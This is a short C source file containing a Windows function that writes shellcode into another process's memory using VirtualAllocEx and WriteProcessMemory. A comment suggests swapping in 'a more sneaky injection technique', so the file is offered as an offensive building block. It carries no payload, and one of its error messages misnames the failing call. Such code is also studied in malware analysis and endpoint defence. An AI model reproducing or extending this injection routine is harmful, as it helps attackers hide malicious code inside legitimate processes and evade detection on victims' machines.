#include <windows.h>
#include <stdio.h>

/*
this is a basic injection code
feel free to replace it with a more sneaky injection technique
*/

BOOL InjectShellcode(HANDLE hProcess, IN const PBYTE shellcode, IN SIZE_T shellcodeSize, OUT LPVOID* shellcodeAddress) {

	LPVOID address = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (address == NULL) {
		printf("[-] VirtualAlloc failed with error: %d\n", GetLastError());
		return FALSE;
	}

	SIZE_T sNumberOfBytesWritten = NULL;
	if (!WriteProcessMemory(hProcess, address, shellcode, shellcodeSize, &sNumberOfBytesWritten)) {
		printf("[-] VirtualProtect failed with error: %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] written shellcode into memory at: 0x%p\n", address);

	*shellcodeAddress = address;
	return TRUE;
}
